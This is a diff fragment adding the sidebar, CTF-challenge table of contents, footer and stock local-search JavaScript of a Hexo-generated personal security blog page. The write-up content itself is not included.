+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">初赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#escape-shellcode"><span class="nav-number">1.1.</span> <span class="nav-text">escape_shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bank"><span class="nav-number">1.2.</span> <span class="nav-text">Bank</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8A%E5%86%B3%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">半决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babynim"><span class="nav-number">2.1.</span> <span class="nav-text">babynim</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B3%E8%B5%9B"><span class="nav-number">3.</span> <span class="nav-text">决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#szp2"><span class="nav-number">3.1.</span> <span class="nav-text">szp2</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
